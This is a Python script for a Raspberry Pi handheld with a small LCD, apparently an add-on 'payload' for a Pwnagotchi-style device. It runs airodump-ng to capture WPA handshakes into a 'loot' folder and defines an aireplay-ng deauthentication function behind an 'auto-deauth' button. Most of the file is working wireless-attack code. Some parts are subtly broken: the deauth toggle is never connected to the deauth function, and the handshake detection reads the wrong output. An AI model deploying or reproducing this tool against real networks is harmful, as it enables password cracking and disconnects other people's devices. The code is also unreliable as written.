#!/usr/bin/env python3
"""
KTOx Payload – Pwnagotchi Fallback (No API)
=============================================
This version does NOT require the bettercap API.
It uses airodump-ng directly to scan and capture handshakes.

Controls:
  KEY1 – toggle deauth mode (auto-deauth on new clients)
  KEY2 – show handshake log
  KEY3 – exit
"""

import os
import sys
import time
import subprocess
import threading
import re
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()
f9 = font(9)

def draw_screen(lines, title="PWNAGOTCHI", title_color="#8B0000", text_color="#FFBBBB"):
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill=title_color)
    d.text((4,3), title[:20], font=f9, fill="#FF3333")
    y = 20
    for line in lines[:7]:
        d.text((4,y), line[:23], font=f9, fill=text_color)
        y += 12
    d.rectangle((0,H-12,W,H), fill="#220000")
    d.text((4,H-10), "K1=deauth  K2=log  K3=exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img,0,0)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Directories
# ----------------------------------------------------------------------
LOOT_DIR = "/root/KTOx/loot/Handshakes"
os.makedirs(LOOT_DIR, exist_ok=True)
HANDSHAKE_LOG = os.path.join(LOOT_DIR, "handshake_log.txt")

# ----------------------------------------------------------------------
# Global state
# ----------------------------------------------------------------------
handshake_count = 0
ap_count = 0
handshake_log = []       # for LCD display
running = True
mon_interface = None
deauth_mode = False
current_target_bssid = None

# ----------------------------------------------------------------------
# airodump-ng background thread
# ----------------------------------------------------------------------
airodump_proc = None
handshake_detected = False
handshake_info = ""

def find_monitor_interface():
    result = subprocess.run("iw dev", shell=True, capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if "Interface" in line and "mon" in line:
            return line.split()[1]
    return None

def start_airodump():
    global airodump_proc, mon_interface, ap_count
    mon_interface = find_monitor_interface()
    if not mon_interface:
        draw_screen(["No monitor interface", "Run: airmon-ng start wlan0"], title="ERROR")
        return False
    cmd = f"airodump-ng --output-format csv -w /tmp/ktox_capture {mon_interface}"
    airodump_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return True

def parse_airodump():
    global ap_count, handshake_detected, handshake_info
    csv_file = "/tmp/ktox_capture-01.csv"
    last_handshake_check = 0
    while running:
        if os.path.exists(csv_file):
            with open(csv_file, errors="ignore") as f:
                lines = f.readlines()
            # Count APs (lines with BSSID)
            aps = [l for l in lines if re.match(r"([0-9A-Fa-f]{2}:){5}", l)]
            ap_count = len(aps)
            # Check for handshake notification in airodump-ng output
            for line in lines:
                if "WPA handshake" in line:
                    now = time.time()
                    if now - last_handshake_check > 5:
                        last_handshake_check = now
                        # Extract BSSID and ESSID
                        parts = line.split(",")
                        if len(parts) >= 6:
                            bssid = parts[0].strip()
                            essid = parts[13].strip() if len(parts) > 13 else "unknown"
                            handshake_detected = True
                            handshake_info = f"{essid} ({bssid})"
                            # Save the handshake file
                            save_handshake(bssid, essid)
        time.sleep(2)

def save_handshake(bssid, essid):
    global handshake_count, handshake_log
    handshake_count += 1
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30]
    if not safe_essid:
        safe_essid = "unknown"
    src_pcap = "/tmp/ktox_capture-01.cap"
    if os.path.exists(src_pcap):
        dest_pcap = os.path.join(LOOT_DIR, f"{safe_essid}_{timestamp}.pcap")
        subprocess.run(f"cp {src_pcap} {dest_pcap}", shell=True)
        with open(HANDSHAKE_LOG, "a") as logf:
            logf.write(f"{timestamp} | BSSID: {bssid} | ESSID: {essid} | File: {dest_pcap}\n")
    log_entry = f"{timestamp[-5:]} {essid[:10]}"
    handshake_log.insert(0, log_entry)
    if len(handshake_log) > 5:
        handshake_log.pop()

def send_deauth(bssid):
    if bssid and mon_interface:
        subprocess.run(f"aireplay-ng --deauth 1 -a {bssid} {mon_interface}", shell=True, capture_output=True)
        return True
    return False

# ----------------------------------------------------------------------
# Drawing
# ----------------------------------------------------------------------
def draw_character(draw, mood):
    if mood == "happy":
        eye_color = "#00FF00"
        mouth = (58, 65, 70, 70)
    else:
        eye_color = "#00AAFF"
        mouth = (58, 68, 70, 70)
    draw.rectangle((48, 30, 80, 70), outline="#00FFAA", width=1)
    draw.rectangle((54, 40, 60, 46), fill=eye_color)
    draw.rectangle((68, 40, 74, 46), fill=eye_color)
    draw.rectangle(mouth, outline="#FF3300", width=1)
    draw.line((64, 30, 64, 22), fill="#FF00AA", width=1)
    draw.ellipse((62, 18, 66, 22), fill="#FF00AA")

def update_display():
    global handshake_detected, handshake_info
    mood = "happy" if handshake_detected else "normal"
    if handshake_detected:
        # Reset after 3 seconds
        threading.Timer(3, lambda: globals().update(handshake_detected=False)).start()
    uptime = int(time.time() - start_time)
    # Custom drawing
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "PWNAGOTCHI", font=f9, fill="#FF3333")
    # Stats
    y = 20
    d.text((4,y), f"HS: {handshake_count}  AP: {ap_count}", font=f9, fill="#FFBBBB")
    y += 12
    d.text((4,y), f"Uptime: {uptime}s", font=f9, fill="#FFBBBB")
    y += 12
    d.text((4,y), f"Deauth: {'ON' if deauth_mode else 'OFF'}", font=f9, fill="#FFBBBB")
    # Character
    draw_character(d, mood)
    # Footer
    d.rectangle((0,H-12,W,H), fill="#220000")
    d.text((4,H-10), "K1=deauth  K2=log  K3=exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img,0,0)

def show_log():
    log_lines = ["Recent Handshakes:"] + handshake_log[:5]
    if not handshake_log:
        log_lines = ["No handshakes yet"]
    draw_screen(log_lines, title="HANDSHAKE LOG", title_color="#004466")
    while True:
        if wait_btn(0.2) is not None:
            break
        time.sleep(0.05)

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
start_time = time.time()

def main():
    global deauth_mode, running, current_target_bssid
    if not start_airodump():
        return
    threading.Thread(target=parse_airodump, daemon=True).start()
    while running:
        update_display()
        btn = wait_btn(0.5)
        if btn == "KEY3":
            break
        elif btn == "KEY1":
            deauth_mode = not deauth_mode
            draw_screen([f"Deauth mode: {'ON' if deauth_mode else 'OFF'}"], title="SETTING")
            time.sleep(1)
        elif btn == "KEY2":
            show_log()
        time.sleep(0.05)
    if airodump_proc:
        airodump_proc.terminate()
    GPIO.cleanup()

if __name__ == "__main__":
    main()
